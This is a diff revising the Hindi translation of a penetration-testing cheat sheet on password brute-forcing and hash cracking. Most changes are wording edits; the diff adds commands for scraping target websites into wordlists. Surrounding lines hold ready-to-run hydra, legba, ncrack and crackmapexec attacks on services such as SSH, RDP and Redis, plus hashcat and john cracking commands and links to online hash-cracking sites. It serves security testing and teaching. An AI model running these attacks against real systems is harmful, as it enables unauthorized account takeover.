@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **अपनी खुद की डिक्शनरी बनाएं**
+## **अपने खुद के शब्दकोश बनाएं**
 
-लक्ष्य के बारे में जितनी संभव हो सके जानकारी प्राप्त करें और एक कस्टम डिक्शनरी बनाएं। उपयोगी उपकरण:
+लक्ष्य के बारे में जितनी संभव हो सके जानकारी प्राप्त करें और एक कस्टम शब्दकोश बनाएं। उपयोगी उपकरण:
 
 ### Crunch
 ```bash
@@ -34,9 +34,16 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Cewl
+### वेबसाइट आधारित वर्डलिस्ट्स
 ```bash
+# Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
@@ -46,7 +53,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-एक शब्द सूची जनरेटर उपकरण, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श शब्द सूची बनाने के लिए जिसका उपयोग एक विशिष्ट लक्ष्य के संबंध में किया जा सके।
+एक वर्डलिस्ट जनरेटर टूल, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श वर्डलिस्ट बनाने के लिए जिसका उपयोग किसी विशेष लक्ष्य के संबंध में किया जा सके।
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -82,7 +89,7 @@ Finished in 0.920s.
 
 ## Services
 
-सेवा नाम के अनुसार वर्णानुक्रम में क्रमबद्ध। 
+सेवा नाम के अनुसार वर्णानुक्रम में व्यवस्थित।
 
 ### AFP
 ```bash
@@ -149,7 +156,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-http**s** के लिए आपको "http-post-form" से "**https-post-form" में बदलना होगा**
+http**s** के लिए आपको "http-post-form" से "**https-post-form" में बदलना होगा।
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
 ```bash
@@ -167,7 +174,7 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-### आईएससीएसआई
+### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
@@ -271,7 +278,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login** को **patator** के साथ उपयोग करने के लिए आपको **install** करने की आवश्यकता है:
+**oracle_login** का उपयोग करने के लिए **patator** के साथ आपको **install** करने की आवश्यकता है:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -279,7 +286,7 @@ pip3 install cx_Oracle --upgrade
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
-### पीओपी
+### POP
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -313,7 +320,7 @@ ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
-### रेडिस
+### Redis
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
@@ -374,7 +381,7 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-### SQL सर्वर
+### SQL Server
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -399,7 +406,7 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ और OpenMQ)
 
-STOMP टेक्स्ट प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला मैसेजिंग प्रोटोकॉल है जो **लोकप्रिय मैसेज कतार सेवाओं** जैसे RabbitMQ, ActiveMQ, HornetQ, और OpenMQ के साथ निर्बाध संचार और इंटरैक्शन की अनुमति देता है। यह संदेशों का आदान-प्रदान करने और विभिन्न मैसेजिंग संचालन करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
+STOMP टेक्स्ट प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला मैसेजिंग प्रोटोकॉल है जो **लोकप्रिय संदेश कतार सेवाओं** जैसे RabbitMQ, ActiveMQ, HornetQ, और OpenMQ के साथ निर्बाध संचार और इंटरैक्शन की अनुमति देता है। यह संदेशों का आदान-प्रदान करने और विभिन्न मैसेजिंग संचालन करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -437,23 +444,23 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-## स्थानीय
+## Local
 
-### ऑनलाइन क्रैकिंग डेटाबेस
+### Online cracking databases
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 के साथ/बिना ESS/SSP और किसी भी चुनौती के मान के साथ)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (हैश, WPA2 कैप्चर, और MSOffice, ZIP, PDF के आर्काइव...)
-- [https://crackstation.net/](https://crackstation.net) (हैश)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (हैश और फ़ाइल हैश)
-- [https://hashes.org/search.php](https://hashes.org/search.php) (हैश)
-- [https://www.cmd5.org/](https://www.cmd5.org) (हैश)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-हैश को ब्रूट फोर्स करने की कोशिश करने से पहले इसे देखें।
+Hash को ब्रूट फोर्स करने की कोशिश करने से पहले इसे देखें।
 
 ### ZIP
 ```bash
@@ -471,9 +478,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### ज्ञात plaintext ज़िप हमला
+#### ज्ञात प्लेनटेक्स्ट ज़िप हमला
 
-आपको **encrypted zip** के अंदर मौजूद **फाइल का plaintext** (या plaintext का एक भाग) जानना आवश्यक है। आप **encrypted zip** के अंदर मौजूद **फाइलों के नाम और आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
+आपको **एन्क्रिप्टेड ज़िप के अंदर** एक फ़ाइल का **प्लेनटेक्स्ट** (या प्लेनटेक्स्ट का एक भाग) जानना आवश्यक है। आप **एन्क्रिप्टेड ज़िप के अंदर शामिल फ़ाइलों के फ़ाइल नाम और आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) को रिलीज़ पृष्ठ से डाउनलोड करें।
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -506,9 +513,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF मालिक पासवर्ड
+### PDF Owner Password
 
-PDF मालिक पासवर्ड क्रैक करने के लिए यह जांचें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner पासवर्ड को क्रैक करने के लिए यह देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -536,7 +543,7 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 #The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-### केबरोस्टिंग
+### Keberoasting
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -581,7 +588,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI मास्टर कुंजी
 
-Use [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) and then john
+उपयोग करें [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) और फिर john
 
 ### ओपन ऑफिस पासवर्ड से सुरक्षित कॉलम
 
@@ -645,7 +652,7 @@ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** हमला
 
-hashcat के साथ **2 वर्डलिस्ट को 1 में मिलाना** संभव है।\
+hashcat के साथ **2 wordlists को 1 में मिलाना** संभव है।\
 यदि सूची 1 में शब्द **"hello"** था और दूसरी में **"world"** और **"earth"** के साथ 2 पंक्तियाँ थीं। शब्द `helloworld` और `helloearth` उत्पन्न होंगे।
 ```bash
 # This will combine 2 wordlists
